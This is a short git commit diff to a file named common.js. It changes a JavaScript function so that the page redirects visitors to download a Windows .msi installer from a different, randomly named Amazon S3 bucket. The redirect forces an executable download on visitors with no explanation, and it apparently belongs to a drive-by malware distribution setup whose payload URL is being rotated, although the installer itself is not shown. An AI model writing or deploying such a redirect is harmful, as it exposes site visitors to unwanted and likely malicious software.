74837fc937c546d2c8b4b1ece3b7bc17b601524b
woshiwnidaye <kwnzhwkjdhekwbsg1762@gmail.com>
2025-07-22 15:59:16 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://ntsastu.s3.ap-southeast-2.amazonaws.com/NTSastu.msi";
+		var url="https://samtens1.s3.ap-southeast-2.amazonaws.com/SAMTens.msi";
 		window.location=url;
 	}
 }
